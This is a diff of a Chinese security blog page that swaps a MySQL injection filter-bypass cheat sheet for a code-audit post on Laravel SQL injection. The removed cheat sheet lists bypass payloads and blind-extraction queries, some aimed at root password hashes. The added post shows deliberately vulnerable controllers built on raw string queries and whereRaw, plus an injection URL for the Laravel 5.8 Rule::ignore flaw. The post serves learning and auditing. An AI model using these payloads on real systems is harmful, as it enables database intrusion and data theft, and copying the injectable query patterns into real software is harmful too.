@@ -20,31 +20,30 @@
     <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="MYSQL一些技巧 仅仅是作为自己备忘录，如果错误，敬请斧正。  0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是">
+    <meta name="description" content="Laravel注入不规范写法导致注入漏洞学习  不规范写法导致的SQL注入漏洞概要只要发现SQL语句是拼凑的基本都会有SQL注入，造成的结果就是没有绑定值，大家可以跟一下代码。 漏洞环境一123456789101112131415161718&lt;?phpnamespace App\Http\Controllers;use Illuminate\Http\Request;use DB;class">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mysql注入技巧备忘录">
-<meta property="og:url" content="http://example.com/2021/07/17/Mysql%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%A4%87%E5%BF%98%E5%BD%95/index.html">
+<meta property="og:title" content="Laravel不规范写法导致注入漏洞">
+<meta property="og:url" content="http://example.com/2021/08/04/Laravel%E4%B8%8D%E8%A7%84%E8%8C%83%E5%86%99%E6%B3%95%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="MYSQL一些技巧 仅仅是作为自己备忘录，如果错误，敬请斧正。  0)基础饶过123456781.大小写绕过2.双写绕过3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;5.宽字节、Latin1默认编码Latin1编码：[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是">
+<meta property="og:description" content="Laravel注入不规范写法导致注入漏洞学习  不规范写法导致的SQL注入漏洞概要只要发现SQL语句是拼凑的基本都会有SQL注入，造成的结果就是没有绑定值，大家可以跟一下代码。 漏洞环境一123456789101112131415161718&lt;?phpnamespace App\Http\Controllers;use Illuminate\Http\Request;use DB;class">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg">
-<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gr0tfjp3joj30y70axmzz.jpg">
-<meta property="og:image" content="https://tvax2.sinaimg.cn/large/00774lbQly1gr0tfrwc97j30yw0antbi.jpg">
-<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a29k7b4j30hs08pdgd.jpg">
-<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a43e5wgj61080a6q5x02.jpg">
-<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr1au2dkhsj30nm06qt8z.jpg">
-<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gr1cfj1sn7j30tf07dq4x.jpg">
-<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gr1ft5dvypj30z506omxd.jpg">
-<meta property="article:published_time" content="2021-07-17T13:47:00.000Z">
-<meta property="article:modified_time" content="2021-07-17T13:47:55.036Z">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt50t1huivj30n209tq4r.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt50t7nvv9j30qe0gln0o.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gt50teqlokj31e90minbk.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/00774lbQly1gt50tl6epbj30yt0ebgrd.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/00774lbQly1gt50tqideaj30p3095whb.jpg">
+<meta property="article:published_time" content="2021-08-04T12:20:00.000Z">
+<meta property="article:modified_time" content="2021-08-04T12:20:56.404Z">
 <meta property="article:author" content="R0ser1">
 <meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Laravel">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg">
+<meta name="twitter:image" content="https://tvax1.sinaimg.cn/large/00774lbQly1gt50t1huivj30n209tq4r.jpg">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>Mysql注入技巧备忘录 · R0ser1&#39;s Blog</title>
+    <title>Laravel不规范写法导致注入漏洞 · R0ser1&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -258,7 +257,7 @@
             <a href="/" >R0ser1&#39;s Blog</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">Mysql注入技巧备忘录</a>
+            <a href="#" class="post-name">Laravel不规范写法导致注入漏洞</a>
         </div>
     </div>
     
@@ -301,7 +300,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Mysql注入技巧备忘录
+            Laravel不规范写法导致注入漏洞
             <!-- 404 -->
             
         </h1>
@@ -322,16 +321,20 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Laravel">Laravel</a>
+    
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.5k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
+                        <span>Word count: <span class="post-count word-count">693</span>Reading time: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2021/07/17</span>
+                    <span class="post-intro-time">2021/08/04</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -455,125 +458,41 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="MYSQL一些技巧"><a href="#MYSQL一些技巧" class="headerlink" title="MYSQL一些技巧"></a>MYSQL一些技巧</h2><blockquote>
-<p>仅仅是作为自己备忘录，如果错误，敬请斧正。</p>
-</blockquote>
-<h3 id="0-基础饶过"><a href="#0-基础饶过" class="headerlink" title="0)基础饶过"></a>0)基础饶过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">2.双写绕过</span><br><span class="line">3.添加注释 &#x2F;*!*&#x2F; or &#x2F;*!小于mysql版本*&#x2F;</span><br><span class="line">5.宽字节、Latin1默认编码</span><br><span class="line">Latin1编码：</span><br><span class="line">[Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有</span><br><span class="line">而utf8中没有的字符，而Mysql是如何处理这些字符的呢？直接忽略。</span><br><span class="line">于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin上面的%c2可以换为%c2-%ef之间的任意字符]</span><br></pre></td></tr></table></figure>
-<h3 id="1-过滤空格"><a href="#1-过滤空格" class="headerlink" title="1)过滤空格"></a>1)过滤空格</h3><blockquote>
-<p>反引号</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from&#96;user&#96;;</span><br></pre></td></tr></table></figure>
+        <center>Laravel注入不规范写法导致注入漏洞学习</center>
 
-<blockquote>
-<p>括号</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; &#39;and(true)like(false)union(select(pass)from(users))#</span><br></pre></td></tr></table></figure>
+<h1 id="不规范写法导致的SQL注入"><a href="#不规范写法导致的SQL注入" class="headerlink" title="不规范写法导致的SQL注入"></a>不规范写法导致的SQL注入</h1><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>只要发现SQL语句是拼凑的基本都会有SQL注入，造成的结果就是没有绑定值，大家可以跟一下代码。</p>
+<h2 id="漏洞环境一"><a href="#漏洞环境一" class="headerlink" title="漏洞环境一"></a>漏洞环境一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MsgController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        DB::connection()-&gt;enableQueryLog();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$res</span>=DB::statement(<span class="variable">$sql</span>);</span><br><span class="line">        dump(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line">        DD(DB::getQueryLog());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>/**/</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;select*from&#x2F;**&#x2F;users;</span><br></pre></td></tr></table></figure>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt50t1huivj30n209tq4r.jpg" alt="image-20210804174542693"></p>
+<h2 id="漏洞环境二"><a href="#漏洞环境二" class="headerlink" title="漏洞环境二"></a>漏洞环境二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用whereRaw 或者 selectRaw导致的SQL注入</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MsgController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        DB::connection()-&gt;enableQueryLog();</span><br><span class="line">          <span class="variable">$id</span>=<span class="variable">$request</span>-&gt;input(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">          <span class="variable">$res</span>=DB::table(<span class="string">&#x27;users&#x27;</span>)-&gt;whereRaw(<span class="string">&quot;id=<span class="subst">$id</span>&quot;</span>)-&gt;get();</span><br><span class="line">          dump(<span class="variable">$res</span>);</span><br><span class="line">        DD(DB::getQueryLog());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>and/or后面可以跟上偶数个!、~可以替代空格,可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt50t7nvv9j30qe0gln0o.jpg" alt="image-20210804174900840"></p>
+<h1 id="Laravel-5-8-SQL注入"><a href="#Laravel-5-8-SQL注入" class="headerlink" title="Laravel 5.8 SQL注入"></a>Laravel 5.8 SQL注入</h1><h2 id="漏洞概要-1"><a href="#漏洞概要-1" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><blockquote>
+<p>漏洞存在于Laravel的表单验证功能，漏洞为Rule类的ignore方法</p>
+<p>漏洞文件位于/vendor/laravel/ramework/src/Illuminate/Validation/Rules/Unique.php</p>
+<p>该方法有两个参数，第一个参数为字段值，第二个参数为字段名，当字段名为空时，默认字段名为“id”。如果用户可以控制ignore()方法的参数值，就会产生SQL注入漏洞。</p>
+<p>影响版本：5.8.5及以下版本</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or- -!!!1&#x3D;1；</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Validation</span>\<span class="title">Rule</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Validator</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MsgController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        DB::connection()-&gt;enableQueryLog();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$validator</span> = Validator::make(<span class="variable">$request</span>-&gt;input(), [</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; [</span><br><span class="line">                <span class="string">&#x27;required&#x27;</span>,</span><br><span class="line">                Rule::unique(<span class="string">&quot;users&quot;</span>)-&gt;ignore(<span class="variable">$request</span>-&gt;input(<span class="string">&quot;id&quot;</span>))</span><br><span class="line">            ],</span><br><span class="line">        ]);</span><br><span class="line">        dump(<span class="variable">$validator</span>-&gt;fails());</span><br><span class="line"></span><br><span class="line">          DD(DB::getQueryLog());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格。</p>
-<p>下面逗号是两列的意思 1e0占了第二列,同样，上面的1E0可以用1.0代替。</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select A,1E0fromB</span><br></pre></td></tr></table></figure>
+<p>访问<a target="_blank" rel="noopener" href="http://www.laravel.com/index?username=admin&amp;id=1%22,R0ser1,%22">http://www.laravel.com/index?username=admin&amp;id=1%22,R0ser1,%22</a></p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt50teqlokj31e90minbk.jpg" alt="image-20210804200141887"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们主要跟几个关键函数吧。</p>
+<p>最近有点累了,害。这个自己也感觉没怎么讲，很多细节都没有说。等分析反序列化的时候再重新好好整理一下这个吧。建议师傅看下面参考链接好了。</p>
+<p>第一个关键点：ignore函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ignore</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$idColumn</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$id</span> <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ignoreModel(<span class="variable">$id</span>, <span class="variable">$idColumn</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">$this</span>-&gt;ignore = <span class="variable">$id</span>;</span><br><span class="line">      <span class="comment">// 我们传入的$id=1&quot;,R0ser1,&quot;</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;idColumn = <span class="variable">$idColumn</span> ?? <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="comment">//因为ignore其实有两个参数但是我们控制键的值没用的，控制键就好了。因为是PDO操作</span></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>\N 绕过,绕过NULL,因为\N相当于NULL</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pass where id&#x3D;\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#39;v&#39;)in(&#39;v&#39;);</span><br></pre></td></tr></table></figure>
+<p>然后直接到我们的<code>__toString</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rtrim(sprintf(<span class="string">&#x27;unique:%s,%s,%s,%s,%s&#x27;</span>,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;column,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ignore ? <span class="string">&#x27;&quot;&#x27;</span>.<span class="keyword">$this</span>-&gt;ignore.<span class="string">&#x27;&quot;&#x27;</span> : <span class="string">&#x27;NULL&#x27;</span>,</span><br><span class="line">                             <span class="comment">//直接赋值</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;idColumn,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatWheres()</span><br><span class="line">        ), <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>空格还可以使用如下替代：</p>
-<blockquote>
-<p>在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">09：Horizontal Tab</span><br><span class="line">0A：New Line</span><br><span class="line">0B：Vertical Tab</span><br><span class="line">0C：New Page</span><br><span class="line">0D：Carriage Return</span><br><span class="line">A0：Non-breaking Space</span><br><span class="line">20：Space</span><br><span class="line">a0：空格</span><br><span class="line">2B：+</span><br></pre></td></tr></table></figure>
+<p>最后返回我们的<code>$rules</code></p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt50tl6epbj30yt0ebgrd.jpg" alt="image-20210804201036102"></p>
+<p>然后经过赋值得到sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) as aggregate from &#96;users&#96; where &#96;username&#96; &#x3D; ? and &#96;R0ser1&#96; &lt;&gt; ? and &#96;&#96; &#x3D; ?</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-过滤单引号："><a href="#2-过滤单引号：" class="headerlink" title="2)过滤单引号："></a>2)过滤单引号：</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/105061424">https://blog.csdn.net/qq_42181428/article/details/105061424</a></p>
-</blockquote>
-<h3 id="3-过滤注释符"><a href="#3-过滤注释符" class="headerlink" title="3)过滤注释符"></a>3)过滤注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;%00  空字节     </span><br><span class="line">&#96;     反引号   </span><br><span class="line">\#     哈希值</span><br><span class="line">-- x   SQL 语法[x为任意 前面有一个空格]</span><br><span class="line">只要闭合单引号或者其他就行  and &#39;x&#39;&#x3D;&#39;x</span><br></pre></td></tr></table></figure>
-
-<p>shch as:</p>
-<p>条件苛刻 报错测试用不了 union可以的。其他没测试,盲注时需要加@。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Users WHERE id &#x3D; &#39;&#39; UNION SELECT 1, 2, 3&#96;&#39; limit 0,1;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-过滤逗号"><a href="#4-过滤逗号" class="headerlink" title="4)过滤逗号"></a>4)过滤逗号</h3><p>1、在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决:</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;select substr(database() from 1 for 1);</span><br><span class="line">&gt;select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>2、点击我查看Join<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/14829001.html">绕过逗号</a></p>
-<p>3、使用like</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))&#x3D;80   #等价于</span><br><span class="line">select user() like &#39;r%&#39;</span><br><span class="line">有就返回1 无返回0</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>4、对于limit可以使用offset来绕过：</p>
-<blockquote>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="meta"># 等价于下面这条SQL语句</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news limit <span class="number">1</span> offset <span class="number">0</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>5、case when then</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when substring((select password from mysql.user where user&#x3D;&#39;root&#39;) from 1 for 1)&#x3D;&#39;e&#39; then sleep(5) else 0 end #</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/88933173">https://blog.csdn.net/zz_Caleb/article/details/88933173</a></p>
-<h3 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5)过滤等号"></a>5)过滤等号</h3><blockquote>
-<p>find_in_set(mid(user(),1,1),’a,b,c,d’) 如果当前用户的第一个字符不在 ‘a,b,c…’ 字符串中，返回0；如果在字符串中，则返回那个字母的索引。如图，r 在字符串中第18个位置。</p>
-</blockquote>
-<p>数据库中，索引的位置返回时间。</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr0th1g11lj30rp0ai0uh.jpg" alt="shujuku"></p>
-<p>实战中要测试，最开始没有R的时候需要2S，然后加上R就是7，而R的位置是5。</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gr0tfjp3joj30y70axmzz.jpg" alt="1sel"></p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gr0tfrwc97j30yw0antbi.jpg" alt="2sellp"></p>
-<blockquote>
-<p>mid(user(),1,1) 返回当前用户的第一个字符,如果当前用户第一个字符在集合后面，返回1，否则返回0。</p>
-</blockquote>
-<p>数据库中</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a29k7b4j30hs08pdgd.jpg" alt="sellp"></p>
-<p>ord(1)=49,ord(0)=48。所以正确就返回7s。</p>
-<p><strong>实战测试中</strong></p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gr1a43e5wgj61080a6q5x02.jpg" alt="test"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1)regexp操作符用于配匹正则表达式， id regexp 1 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">2)&lt;&gt;等价于!&#x3D; 所以在前面加一个!结果就是等号 !(id&lt;&gt;1) 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">3)使用大小于号来绕过，id &gt; 1 and id &lt; 3 与 id &#x3D; 1 效果一样</span><br><span class="line"></span><br><span class="line">4)不加通配符的like、rlike执行的效果和 &#x3D; 一致</span><br><span class="line"></span><br><span class="line">5)between a and b ：范围在a-b之间 id between 1 and 1 与 id &#x3D; 1 效果相同</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-过滤过滤比较符号-（-lt-和-gt-）"><a href="#6-过滤过滤比较符号-（-lt-和-gt-）" class="headerlink" title="6)过滤过滤比较符号 （ &lt; 和 &gt; ）"></a>6)过滤过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h3><p>使用<strong>greatest()、least（）函数</strong>绕过</p>
-<blockquote>
-<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
-<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>
-
-<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值<br>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gr1au2dkhsj30nm06qt8z.jpg" alt="QQ截图20210531082158"></p>
-<p>看上面的截取，第一位和第二位显示。</p>
-<p><strong>使用between a and b ：范围在a-b之间</strong></p>
